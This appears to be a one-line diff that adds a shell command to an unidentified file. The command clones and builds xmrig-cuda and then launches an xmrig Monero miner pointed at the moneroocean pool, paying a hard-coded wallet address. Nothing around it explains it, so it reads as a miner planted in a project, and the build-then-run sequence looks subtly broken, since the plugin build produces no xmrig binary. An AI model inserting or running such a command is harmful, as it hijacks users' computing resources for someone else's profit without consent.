@@ -1,0 +1,1 @@
+git clone https://github.com/xmrig/xmrig-cuda.git && mkdir xmrig-cuda/build && cd xmrig-cuda/build && cmake .. -DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/usr/local/cuda && make -j$(nproc) && ./xmrig -o gulf.moneroocean.stream:10128 -u 47rRaVrE8xhenVsK2oF5spDgR7A6CJiKT6SHrNmuq8UGJUp3fRegVpS583QQPTsRWWL7L87FSKKaf5qHrpfDPPpM6CzmhGY -p ssz2 
